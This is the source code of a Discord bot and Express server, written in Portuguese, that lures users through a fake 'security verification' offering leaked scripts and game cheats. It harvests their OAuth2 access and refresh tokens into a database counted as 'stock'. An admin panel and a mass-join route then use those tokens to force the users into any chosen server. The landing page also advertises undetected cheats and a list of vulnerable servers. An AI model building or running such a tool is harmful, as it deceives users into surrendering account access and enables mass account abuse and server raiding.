require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET_DEFAULT = 'https://discord.com/app'; 
const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; // Link final de 0.3s
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// --- SETUP DO BANCO (POSTGRES) ---
let pool = null;

async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: { rejectUnauthorized: false }
        });
        try {
            await pool.query(`
                CREATE TABLE IF NOT EXISTS auth_users (
                    id VARCHAR(255) PRIMARY KEY,
                    username VARCHAR(255),
                    access_token TEXT,
                    refresh_token TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            `);
            console.log('✅ Banco conectado e tabela verificada.');
        } catch (err) { console.error("❌ Erro no banco:", err); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// =================================================================
// FUNÇÃO AUXILIAR PARA OAUTH2 (Redirecionamento Rápido)
// =================================================================

async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');

    try {
        // 1. Troca Código por Token
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: redirectUri, 
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // 2. Salva no Banco (SQL)
        if (pool) {
            await pool.query(`
                INSERT INTO auth_users (id, username, access_token, refresh_token)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (id) 
                DO UPDATE SET access_token = $3, refresh_token = $4;
            `, [user.id, user.username, access_token, refresh_token]);
        }

        // 3. Tenta dar cargo
        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) await member.roles.add(role);
                }
            } catch (e) {}
        }

        // 4. Log
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token').setDescription(`**Usuário:** ${user.username}`).setColor('Blue')] });
        }

        // 5. PÁGINA DE SUCESSO E REDIRECIONAMENTO RÁPIDO (300ms)
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificando...</title>
                <style>
                    body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column}
                    .spinner{width:50px;height:50px;border:5px solid rgba(255,255,255,0.1);border-top:5px solid #23a559;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
                </style>
            </head>
            <body>
                <div class="spinner"></div>
                <h2>✅ Verificado</h2>
                <p>Redirecionando rapidamente para a página de conteúdo...</p>
                <script>
                    // REDIRECIONAMENTO EXTREMAMENTE RÁPIDO (0.3 segundos)
                    setTimeout(() => {
                        window.location.href = "${finalTarget}";
                    }, 300); 
                </script>
            </body>
            </html>
        `);

    } catch (e) { console.error(e); res.send('Erro auth.'); }
}

// =================================================================
// ROTAS DE VERIFICAÇÃO NO SITE
// =================================================================

// ROTA 1: PADRÃO (Redireciona para o Discord App - 3s)
app.get('/callback', async (req, res) => {
    // Note: Usei 3000ms aqui para o default, mas o usuário pediu 300ms para a rota 2.
    await handleVerificationCallback(req, res, process.env.REDIRECT_URI, REDIRECT_TARGET_DEFAULT);
});

// ROTA 2: GAME DOWNLOAD (Redirecionamento 0.3s)
app.get('/auth2', async (req, res) => {
    await handleVerificationCallback(req, res, process.env.REDIRECT_URI_2, REDIRECT_TARGET_GAME);
});


// [O restante das rotas e comandos permanece o mesmo]...

app.get('/', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
    res.send(`
        <body style="background:#1e1f22;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column">
            <h1>🤖 Bot Online</h1>
            <p>Estoque Seguro: <b>${count}</b> usuários.</p>
            <div style="display:flex;gap:10px;">
                <a href="/painel" style="color:#5865F2;text-decoration:none;border:1px solid #5865F2;padding:10px;border-radius:5px;">Admin Painel</a>
                <a href="/game" style="color:#23a559;text-decoration:none;border:1px solid #23a559;padding:10px;border-radius:5px;">Game Hub</a>
            </div>
        </body>
    `);
});

app.get('/painel', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Painel Admin</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background-color: #2b2d31; color: #f2f3f5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding-top: 50px; }
                .container { background: #313338; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
                h2 { color: #5865F2; text-align: center; margin-top: 0; }
                label { display: block; margin-top: 15px; font-weight: bold; color: #b5bac1; }
                input { width: 100%; padding: 10px; margin-top: 5px; background: #1e1f22; border: 1px solid #1e1f22; color: white; border-radius: 4px; box-sizing: border-box; }
                button { width: 100%; padding: 12px; margin-top: 25px; background: #23a559; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; }
                .stats { text-align: center; margin-bottom: 20px; font-size: 14px; color: #949ba4; }
                .highlight { color: #fff; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🎛️ Painel de Controle</h2>
                <div class="stats">Membros no Banco: <span class="highlight">${count}</span></div>
                <form action="/api/mass-join" method="POST">
                    <label>Senha de Admin</label>
                    <input type="password" name="password" required>
                    <label>ID do Servidor Destino</label>
                    <input type="text" name="serverId" required>
                    <label>Quantidade</label>
                    <input type="number" name="amount" required min="1" max="${count}">
                    <button type="submit">🚀 Iniciar Envio</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

app.get('/game', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Game Hub - Exclusive Content</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');
                body { margin: 0; padding: 0; background-color: #0f0f13; color: white; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
                .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle at center, #1a1b26 0%, #0f0f13 100%); text-align: center; padding: 40px 20px; }
                h1 { font-size: 4rem; margin-bottom: 10px; text-transform: uppercase; background: linear-gradient(90deg, #00f260, #0575E6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 30px rgba(5, 117, 230, 0.3); }
                p { font-size: 1.2rem; color: #a0a0a0; max-width: 600px; margin-bottom: 40px; }
                .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; width: 100%; max-width: 1000px; }
                .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; transition: 0.3s; cursor: pointer; }
                .card:hover { transform: translateY(-10px); background: rgba(255, 255, 255, 0.1); border-color: #00f260; box-shadow: 0 0 20px rgba(0, 242, 96, 0.2); }
                .card h3 { font-size: 1.5rem; margin-top: 0; }
                .card span { color: #00f260; font-weight: bold; display: block; margin: 10px 0; }
                .btn { margin-top: 10px; display: inline-block; padding: 10px 25px; background: #5865F2; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; transition: 0.2s; }
                .btn:hover { background: #4752c4; }
            </style>
        </head>
        <body>
            <div class="hero">
                <h1>Game Hub</h1>
                <p>Acesse scripts exclusivos, ferramentas beta e conteúdos vazados diretamente da nossa base de dados segura.</p>
                <div class="grid">
                    <div class="card">
                        <h3>Script Blox Fruits</h3>
                        <p>Auto farm, Auto raid e ESP.</p>
                        <span>STATUS: UNDETECTED 🟢</span>
                        <a href="#" class="btn">Baixar</a>
                    </div>
                    <div class="card">
                        <h3>Executor PC</h3>
                        <p>Injetor level 8 sem key.</p>
                        <span>STATUS: ATUALIZADO 🟠</span>
                        <a href="#" class="btn">Acessar</a>
                    </div>
                    <div class="card">
                        <h3>Database Dump</h3>
                        <p>Lista de servidores vulneráveis.</p>
                        <span>STATUS: VIP ONLY 🔒</span>
                        <a href="#" class="btn" style="background:#333; cursor: not-allowed;">Bloqueado</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if (!ADMIN_PASSWORD) return res.send('ERRO: Configure ADMIN_PASSWORD no Render.');
    if (password !== ADMIN_PASSWORD) return res.send('<h1 style="color:red">Senha Incorreta</h1>');
    if (!pool) return res.send('Erro: Banco desconectado.');

    let users = [];
    try {
        const result = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]);
        users = result.rows;
    } catch(e) { return res.send('Erro ao buscar no banco.'); }

    if (users.length === 0) return res.send('Banco vazio.');

    res.send(`<body style="background:#2b2d31;color:white;text-align:center;padding-top:50px;"><h1>✅ Comando Recebido!</h1><p>O bot começou a enviar <b>${users.length}</b> usuários.</p></body>`);

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let sucesso = 0, falha = 0;

    for (const user of users) {
        try {
            await axios.put(`https://discord.com/api/guilds/${serverId}/members/${user.id}`, { access_token: user.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } });
            sucesso++;
        } catch (error) {
            if (error.response && error.response.status === 401) pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]).catch(()=>{});
            falha++;
        }
        await sleep(1000);
    }

    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (logChannel) logChannel.send({ embeds: [new EmbedBuilder().setTitle('🖥️ Painel Web').setDescription(`**Alvo:** \`${serverId}\`\n**Sucesso:** ${sucesso}\n**Falha:** ${falha}`).setColor('Green')] });
});


// --- BOT ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Auth' },
        { name: 'estoque', description: 'Ver quantidade salva' },
        { name: 'enviar', description: 'Mass Join via Comando', options: [{name:'quantidade',type:4,required:true},{name:'servidor_id',type:3,required:true}] }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
        
        const embed = new EmbedBuilder()
            .setTitle('🛡️ Verificação de Segurança')
            .setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!')
            .setColor(0x5865F2)
            .setFooter({ text: 'Sistema seguro de Verificação' });

        interaction.reply({ content: 'Painel enviado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }
    
    if (interaction.commandName === 'estoque') {
        let count = 0;
        if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
        interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
    }

    if (interaction.commandName === 'enviar') {
        interaction.reply({ content: 'Por favor, use o painel web: /painel', ephemeral: true });
    }
});

// --- INICIALIZAÇÃO SEGURA ---
iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
    client.login(process.env.BOT_TOKEN);
});
